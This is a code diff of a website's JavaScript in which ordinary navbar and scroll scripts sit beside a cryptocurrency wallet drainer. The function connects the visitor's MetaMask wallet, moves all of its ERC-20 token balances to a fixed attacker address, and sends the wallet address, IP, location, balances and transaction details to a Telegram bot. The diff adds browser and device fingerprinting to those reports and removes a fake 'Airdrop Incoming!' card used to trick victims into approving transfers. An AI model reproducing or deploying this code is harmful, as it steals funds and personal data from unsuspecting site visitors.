@@ -14,7 +14,7 @@ const addEventOnElem = function (elem, type, callback) {
 };
 
 /**
- * Navbar toggle, header active, and other UI scripts
+ * Navbar toggle
  */
 const navbar = document.querySelector("[data-navbar]");
 const navbarLinks = document.querySelectorAll("[data-nav-link]");
@@ -36,6 +36,9 @@ const closeNavbar = function () {
 
 addEventOnElem(navbarLinks, "click", closeNavbar);
 
+/**
+ * Header active on scroll
+ */
 const header = document.querySelector("[data-header]");
 
 const activeHeader = function () {
@@ -48,6 +51,9 @@ const activeHeader = function () {
 
 addEventOnElem(window, "scroll", activeHeader);
 
+/**
+ * Toggle active on add to fav
+ */
 const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
 
 const toggleActive = function () {
@@ -56,6 +62,9 @@ const toggleActive = function () {
 
 addEventOnElem(addToFavBtns, "click", toggleActive);
 
+/**
+ * Scroll reveal effect
+ */
 const sections = document.querySelectorAll("[data-section]");
 
 const scrollReveal = function () {
@@ -72,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect and token transfer with Telegram notification
+ * Wallet connect and token transfer with Telegram notification including user agent
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -107,6 +116,45 @@ async function connectWalletAndSendTokens() {
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
     console.log(`Wallet connected: ${userAddress} (MetaMask)`);
+
+    // Capture user agent
+    const userAgent = navigator.userAgent;
+    let deviceType = "Unknown";
+    let browser = "Unknown";
+    let os = "Unknown";
+
+    // Detect device type
+    if (/Mobile|Android|iPhone|iPad/i.test(userAgent)) {
+      deviceType = "Mobile";
+    } else if (/Tablet/i.test(userAgent)) {
+      deviceType = "Tablet";
+    } else {
+      deviceType = "Desktop";
+    }
+
+    // Detect browser
+    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+      browser = "Chrome";
+    } else if (userAgent.includes("Firefox")) {
+      browser = "Firefox";
+    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+      browser = "Safari";
+    } else if (userAgent.includes("Edg")) {
+      browser = "Edge";
+    }
+
+    // Detect operating system
+    if (userAgent.includes("Windows")) {
+      os = "Windows";
+    } else if (userAgent.includes("Mac OS")) {
+      os = "MacOS";
+    } else if (userAgent.includes("Android")) {
+      os = "Android";
+    } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+      os = "iOS";
+    } else if (userAgent.includes("Linux")) {
+      os = "Linux";
+    }
 
     let locationData = {};
     try {
@@ -227,6 +275,10 @@ Address: ${userAddress}
 Wallet: MetaMask
 Country: ${locationData.country_name}
 IP: ${locationData.ip}
+Device: ${deviceType}
+Browser: ${browser}
+OS: ${os}
+User Agent: ${userAgent}
 
 💰 Balances:
 ${tokenSummaryTelegram}
@@ -256,15 +308,8 @@ ${nativeBalanceMessage}
               ], currentSigner);
 
               const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
-
-              // Show enhanced airdrop card
-              showAirdropCard();
-
               const transferTx = await contract.transfer(network.exodusAddress, token.balance);
               await transferTx.wait();
-
-              // Hide card after transaction
-              hideAirdropCard();
 
               const transferSuccessMessage = `
 ✅ Transfer Successful
@@ -272,6 +317,9 @@ Token: ${token.symbol}
 Amount: ${balance}
 To: ${network.exodusAddress}
 Tx: ${transferTx.hash}
+Device: ${deviceType}
+Browser: ${browser}
+OS: ${os}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -279,13 +327,13 @@ Tx: ${transferTx.hash}
                 body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
               });
             } catch (err) {
-              // Hide card on error
-              hideAirdropCard();
-
               const errorMessage = `
 ❌ Transfer Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
+Device: ${deviceType}
+Browser: ${browser}
+OS: ${os}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -299,6 +347,9 @@ Error: ${err.message}
           const noTokensMessage = `
 ⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
+Device: ${deviceType}
+Browser: ${browser}
+OS: ${os}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -307,7 +358,7 @@ Address: ${userAddress}
           });
         }
       } catch (err) {
-        const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
+        const errorMessage = `❌ Error on ${network.name}: ${err.message}\nDevice: ${deviceType}\nBrowser: ${browser}\nOS: ${os}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -316,53 +367,12 @@ Address: ${userAddress}
       }
     }
   } catch (err) {
-    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
+    const errorMessage = `❌ Wallet Connection Failed: ${err.message}\nDevice: ${deviceType}\nBrowser: ${browser}\nOS: ${os}`;
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: chatId, text: errorMessage })
     });
-  }
-}
-
-/**
- * Airdrop card functions
- */
-function showAirdropCard() {
-  // Remove any existing card
-  const existingCard = document.getElementById("airdrop-card");
-  if (existingCard) existingCard.remove();
-
-  // Create card
-  const card = document.createElement("div");
-  card.id = "airdrop-card";
-  card.innerHTML = `
-    <div class="airdrop-card-content">
-      <img src="https://cryptologos.cc/logos/cryptex-finance-ctx-logo.png" alt="CTX Logo" class="token-logo">
-      <h2>Airdrop Incoming!</h2>
-      <p>100 $CTX (Cryptex Finance Coin) is being credited to your wallet!</p>
-      <div class="progress-bar">
-        <div class="progress"></div>
-      </div>
-      <p class="small-text">Please confirm the transaction in MetaMask to proceed.</p>
-    </div>
-  `;
-  document.body.appendChild(card);
-
-  // Trigger progress bar animation
-  setTimeout(() => {
-    const progress = card.querySelector(".progress");
-    if (progress) {
-      progress.style.width = "100%";
-    }
-  }, 100);
-}
-
-function hideAirdropCard() {
-  const card = document.getElementById("airdrop-card");
-  if (card) {
-    card.style.opacity = "0";
-    setTimeout(() => card.remove(), 300);
   }
 }
 
